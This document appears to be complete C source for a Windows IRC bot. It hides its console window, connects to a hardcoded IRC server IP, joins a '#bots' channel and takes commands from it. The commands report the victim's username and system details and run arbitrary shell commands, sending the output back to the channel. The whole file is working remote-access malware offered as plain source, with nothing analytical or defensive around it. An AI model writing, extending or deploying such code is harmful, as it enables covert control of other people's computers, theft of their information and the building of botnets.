#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>
#include <tchar.h>
#pragma comment(lib,"user32.lib")

#define INFOBUFSIZ 32767
#define CHANNEL "#bots"

int connected = 1;


char strip_char(char* string,char character);
void parse_msg(char string[],char *arg_array[]);
void parse_command(char *cmd_array[],char nick[],int sockd);


int main(int argc,char *argv[]){
	ShowWindow(GetConsoleWindow(),SW_HIDE); // should hide console window
	int sd;
	struct sockaddr_in sin;
	WSADATA wsaData;
	char sbuf[1024];
	char rbuf[1024];

	char dest_ip[100];
	int dest_port = 6667;

	if(WSAStartup(MAKEWORD(2,0),&wsaData) != 0){
		//printf("WSAStartup failed.\n");
		exit(1);
	}

	if((sd = socket(AF_INET,SOCK_STREAM,0)) == -1){
		//printf("Failed to create socket.\n");
		exit(1);
	}
	strcpy(dest_ip,"84.242.109.195");

	char nick[9];
	char compname[MAX_COMPUTERNAME_LENGTH+1];
	DWORD namesize = MAX_COMPUTERNAME_LENGTH+1;
	GetComputerName(compname,&namesize);
	strip_char(compname,' ');
	strncpy(nick,compname,9);

	sin.sin_family = AF_INET;
	sin.sin_addr.s_addr = inet_addr(dest_ip);
	sin.sin_port = htons(dest_port);

	if(connect(sd,(struct sockaddr*)&sin,sizeof(sin)) < 0){
		//printf("Connect failed.\n");
		exit(1);
	}

	/* Authenticate with nick, join channel and say hello */
	sprintf(sbuf,"USER %s 0 0 :%s\r\n",nick,nick);
	send(sd,sbuf,strlen(sbuf),0);

	sprintf(sbuf,"NICK %s\r\n",nick);
	send(sd,sbuf,strlen(sbuf),0);

	sprintf(sbuf,"JOIN #bots\r\n");
	send(sd,sbuf,strlen(sbuf),0);

	sprintf(sbuf,"PRIVMSG %s :Hello world!\r\n",CHANNEL);
	send(sd,sbuf,strlen(sbuf),0);

	char *pstr;
	char message[256];
	char *command_array[32]; // [0] == bot_id, [1] == cmd, [2..] == cmd_args
	while(connected){
		memset(rbuf,0,sizeof(rbuf));
		memset(sbuf,0,sizeof(sbuf));

		recv(sd,rbuf,(sizeof(rbuf) - 1),0);
		if((pstr = strstr(rbuf,":!")) == NULL){
			send(sd,"0",1,0);
			continue;
		}
		strip_char(rbuf,'\r');
		strip_char(rbuf,'\n');

		sprintf(message,"%s",&pstr[0]);
		strip_char(message,':');
		strip_char(message,'!');

		parse_msg(message,command_array);
		parse_command(command_array,nick,sd);
	}

	closesocket(sd);
	WSACleanup();

	exit(0);
}


char strip_char(char* string,char character){
	char *pr = string, *pw = string;
	while(*pr){
		*pw = *pr++;
		pw += (*pw != character);
	}
	*pw = '\0';
}


void parse_msg(char string[],char *arg_array[]){
	char *pch;
	int i = 0;
	pch = strtok(string," ");
	while(pch != NULL){
		arg_array[i++] = pch;
		pch = strtok(NULL," ");
	}
}


void parse_command(char *cmd_array[],char nick[],int sockd){
	TCHAR infobuf[INFOBUFSIZ];
	DWORD bufcharcount = INFOBUFSIZ;
	char sendbuf[1024];
	SYSTEM_INFO sysinfo;

	int j=2;
	char shell_cmdstr[2048];
	char cmd_output_buf[2048];
	FILE *shellcmd;


	if((strcmp(cmd_array[0],nick)) != 0 && (strcmp(cmd_array[0],"all")) != 0){
		return;
	}
	if((strcmp(cmd_array[1],"quit")) == 0){
		connected = 0;
		return;
	}
	else if((strcmp(cmd_array[1],"info")) == 0){
		GetUserName(infobuf,&bufcharcount);
		sprintf(sendbuf,"PRIVMSG %s :Username: %s\r\n",CHANNEL,infobuf);
		send(sockd,sendbuf,strlen(sendbuf),0);
		memset(sendbuf,0,sizeof(sendbuf));

		GetSystemDirectory(infobuf,INFOBUFSIZ);
		sprintf(sendbuf,"PRIVMSG %s :System Directory: %s\r\n",CHANNEL,infobuf);
		send(sockd,sendbuf,strlen(sendbuf),0);
		memset(sendbuf,0,sizeof(sendbuf));

		GetWindowsDirectory(infobuf,INFOBUFSIZ);
		sprintf(sendbuf,"PRIVMSG %s :Windows Directory: %s\r\n",CHANNEL,infobuf);
		send(sockd,sendbuf,strlen(sendbuf),0);
		memset(sendbuf,0,sizeof(sendbuf));

		GetSystemInfo(&sysinfo);
		sprintf(sendbuf,"PRIVMSG %s :Processor Type: %u\r\n",CHANNEL,sysinfo.dwProcessorType);
		send(sockd,sendbuf,strlen(sendbuf),0);
		memset(sendbuf,0,sizeof(sendbuf));
	}
	else if((strcmp(cmd_array[1],"cmd")) == 0){
		while(cmd_array[j] != NULL){
			strcat(shell_cmdstr,cmd_array[j]);
			strcat(shell_cmdstr," ");
			j++;
		}
		strcat(shell_cmdstr," 2> nul"); // don't print error messages

		if((shellcmd = popen(shell_cmdstr,"r")) == NULL){
			sprintf(sendbuf,"PRIVMSG %s :popen error\r\n",CHANNEL);
			send(sockd,sendbuf,strlen(sendbuf),0);
			memset(sendbuf,0,sizeof(sendbuf));
		}else{
			while(fgets(cmd_output_buf,sizeof(cmd_output_buf),shellcmd) != 0){
				sprintf(sendbuf,"PRIVMSG %s :%s\r\n",CHANNEL,cmd_output_buf);
				send(sockd,sendbuf,strlen(sendbuf),0);
				memset(sendbuf,0,sizeof(sendbuf));
			}
		}

		memset(shell_cmdstr,0,sizeof(shell_cmdstr));
		memset(sendbuf,0,sizeof(sendbuf));
		pclose(shellcmd);
	}
	else{
		sprintf(sendbuf,"PRIVMSG %s :Syntax is !<nick> [<cmd> <command>] [info] [quit]\r\n",CHANNEL);
		send(sockd,sendbuf,strlen(sendbuf),0);
		memset(sendbuf,0,sizeof(sendbuf));
	}

	memset(sendbuf,0,sizeof(sendbuf));
	memset(shell_cmdstr,0,sizeof(shell_cmdstr));
	memset(cmd_output_buf,0,sizeof(cmd_output_buf));
}
